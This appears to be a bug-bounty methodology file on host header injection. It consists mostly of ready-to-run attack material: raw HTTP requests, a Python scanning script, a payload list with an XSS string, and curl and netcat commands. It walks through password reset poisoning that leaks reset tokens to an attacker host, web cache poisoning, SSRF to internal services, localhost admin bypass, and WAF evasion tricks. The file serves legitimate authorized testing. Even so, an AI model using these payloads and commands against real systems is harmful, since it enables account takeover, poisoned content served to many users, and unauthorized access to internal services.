---
name: "host-header-injection"
version: "2.0"
category: "auth"
subcategory: "header-injection"
phase: "scanning"
tags: ["bug-bounty", "auth", "header-injection", "host-header", "password-reset-poisoning", "cache-poisoning", "ssrf"]
tools: ["curl", "burp-suite", "ffuf", "python3", "netcat"]
follow_up_skills: ["waf-bypass-headers", "admin-panel-bypass", "cache-poisoning-deception", "ssrf"]
description: "Bug bounty skill: host header injection - scanning phase, auth category"
---
# Host Header Injection

## Summary

Host Header Injection occurs when a web application trusts the HTTP `Host` header without proper validation. Attackers manipulate this header to inject malicious values used in URL generation, password reset links, cache keys, or access control decisions. Can lead to password reset poisoning, web cache poisoning, SSRF, and authentication bypass.

## Key Concepts

- **HTTP Host Header**: Mandatory HTTP/1.1 header specifying the target domain. Introduced in HTTP/1.1 to allow servers to differentiate between multiple domains or applications hosted on the same IP address.
- **Purpose**: Identifies the intended server or back-end component that should process the request, critical for virtual hosting and routing traffic via intermediaries (load balancers, reverse proxies, CDNs).
- **Virtual Hosting**: A single web server hosts multiple websites; the `Host` header distinguishes requests for different domains and routes them to the appropriate back-end.
- **Routing via Intermediaries**: Load balancers, reverse proxies, and CDNs use the `Host` header to direct requests to the correct origin server or back-end application.
- **Root Cause**: Blindly trusting the `Host` header without validation.
- **Impact Chain**: Manipulated Host → reflected in response → password reset poisoning / cache poisoning / SSRF / auth bypass.

## Technical Details

### Phase 1: Initial Discovery

**Baseline request:**
```
GET /api/user/profile HTTP/1.1
Host: vulnerable-app.com
```
Response shows `profile_url: "https://vulnerable-app.com/users/john_doe"`.

**Manipulated request:**
```
GET /api/user/profile HTTP/1.1
Host: evil.com
```
If response reflects `"profile_url": "https://evil.com/users/john_doe"` — vulnerability confirmed.

### Phase 2: Attack Vector Tests

**Test 1 — Arbitrary Host Injection**
```
GET /dashboard HTTP/1.1
Host: attacker-controlled.com
```

**Test 2 — Port Number Manipulation**
```
GET /dashboard HTTP/1.1
Host: vulnerable-app.com:8080
```

**Test 3 — Host Header with XSS**
```
GET /dashboard HTTP/1.1
Host: vulnerable-app.com"><script>alert(1)</script>
```

**Test 4 — Duplicate Host Headers**
```
GET /dashboard HTTP/1.1
Host: vulnerable-app.com
Host: evil.com
```

**Test 4b — Line Wrapping (Space Prefix)**
Some servers or WAFs treat headers with leading whitespace differently from the first occurrence. The second `Host` header may override the first if the parser skips indented lines.
```
GET /dashboard HTTP/1.1
 Host: vulnerable-app.com
Host: evil.com
```

**Test 5 — Absolute URL in Request Line**
```
GET https://vulnerable-app.com/dashboard HTTP/1.1
Host: evil.com
```

**Test 6 — Host Override Headers**
```
GET /dashboard HTTP/1.1
Host: vulnerable-app.com
X-Forwarded-Host: evil.com

GET /dashboard HTTP/1.1
Host: vulnerable-app.com
X-Host: evil.com
X-Forwarded-Server: evil.com

GET /dashboard HTTP/1.1
Host: vulnerable-app.com
X-Forwarded-For: evil.com

GET /dashboard HTTP/1.1
Host: vulnerable-app.com
X-Client-IP: evil.com

GET /dashboard HTTP/1.1
Host: vulnerable-app.com
X-Remote-IP: evil.com

GET /dashboard HTTP/1.1
Host: vulnerable-app.com
X-Remote-Addr: evil.com
```

### Exploitation Scenarios

**Scenario 1 — Password Reset Poisoning**

Attacker sends:
```
POST /forgot-password HTTP/1.1
Host: attacker.com
email=victim@example.com
```

Victim receives email with link: `https://attacker.com/reset?token=abc123xyz456`. When clicked, token is sent to attacker's server.

**Scenario 2 — Web Cache Poisoning**

Identify cached CSS/JS: Check `X-Cache: MISS` → `Cache-Control: public`.
```
GET /static/main.css HTTP/1.1
Host: evil.com
```
Response with `X-Cache: HIT` serves poisoned content to all users.

**Scenario 3 — Server-Side Request Forgery (SSRF)**
```
GET /api/fetch-data HTTP/1.1
Host: 127.0.0.1:6379
```
May cause backend to request internal Redis server.

**Scenario 4 — Authentication Bypass**
```
GET /admin/panel HTTP/1.1
Host: localhost
```
App trusts `localhost` without authentication → admin panel access.

### Automated Testing Script (Python)

```python
import requests

def test_host_header(url, payloads):
    results = []
    for payload in payloads:
        headers = {'Host': payload}
        try:
            response = requests.get(url, headers=headers, timeout=5)
            results.append({
                'payload': payload,
                'status': response.status_code,
                'reflected': payload in response.text
            })
        except Exception as e:
            results.append({'payload': payload, 'error': str(e)})
    return results

payloads = ['evil.com', 'localhost', '127.0.0.1',
            'vulnerable-app.com:@evil.com', 'vulnerable-app.com.evil.com']

results = test_host_header('https://vulnerable-app.com/api/user', payloads)
```

## Methodology

### Detection Checklist

1. Test basic Host header manipulation (different domain).
2. Try duplicate Host headers.
3. Test `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server` headers.
4. Check password reset and newsletter/subscription functionality for host reflection in email links.
5. Test cached endpoints for cache poisoning.
6. Try `localhost` / `127.0.0.1` variants for auth bypass.
7. Test with port numbers appended.
8. Check for URL reflection in API responses.
9. Test absolute URLs in the request line.
10. Verify injection in email links.
11. Check API responses for host reflection.
12. Test administrative/restricted endpoints.

## Payloads

```
evil.com
localhost
127.0.0.1
vulnerable-app.com:8080
vulnerable-app.com"><script>alert(1)</script>
vulnerable-app.com:@evil.com
vulnerable-app.com.evil.com
```

## Commands

```bash
# Basic Host header test
curl -H "Host: evil.com" -I https://target.com

# Duplicate Host headers
printf "GET / HTTP/1.1\r\nHost: target.com\r\nHost: evil.com\r\n\r\n" | nc target.com 80

# Line wrapping (space prefix)
printf "GET / HTTP/1.1\r\n Host: target.com\r\nHost: evil.com\r\n\r\n" | nc target.com 80

# X-Forwarded-Host test
curl -H "Host: target.com" -H "X-Forwarded-Host: evil.com" https://target.com

# Other override headers
curl -H "Host: target.com" -H "X-Forwarded-For: evil.com" https://target.com
curl -H "Host: target.com" -H "X-Client-IP: evil.com" https://target.com
curl -H "Host: target.com" -H "X-Remote-IP: evil.com" https://target.com
curl -H "Host: target.com" -H "X-Remote-Addr: evil.com" https://target.com

# Password reset poisoning test
curl -X POST https://target.com/forgot-password -H "Host: attacker.com" -d "email=victim@test.com"

# Cache poisoning test
curl -H "Host: evil.com" https://target.com/static/main.css

# Auth bypass via localhost
curl -H "Host: localhost" https://target.com/admin/panel
```

## Tools

- Burp Suite (Repeater, Intruder)
- curl / netcat
- Custom Python scripts (requests library)

## Bypass Techniques

- **X-Forwarded-Host / X-Host**: Some apps check alternative headers before the `Host` header.
- **X-Forwarded-For / X-Client-IP / X-Remote-IP / X-Remote-Addr**: Additional override headers that may influence server-side host resolution.
- **Duplicate Host headers**: Different servers/WAFs may interpret conflicting Host headers differently.
- **Line wrapping (space prefix)**: Leading whitespace before `Host:` may cause inconsistent parsing between WAF and origin server.
- **Absolute URL in request line**: `GET https://target.com/path HTTP/1.1` with a different `Host:` value.
- **Port number suffix**: May bypass weak validation that only checks the domain name.
- **Special characters**: XSS injection via Host header if reflected without encoding.
- **localhost / 127.0.0.1**: May bypass IP-based access controls.

## Notes

- Password reset poisoning is one of the most dangerous exploitation scenarios — leads to full account takeover.
- Web cache poisoning via Host header can affect all users of the application.
- Always test both `Host` header and alternative headers (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`).
- The same vulnerability can manifest differently across endpoints (API vs password reset vs cache).
- Automated scanners often miss host header injection in non-obvious endpoints.

## References

- https://iaraoz.medium.com/host-header-injection-a-practical-methodology-for-security-testing-c5dab8abf2cf
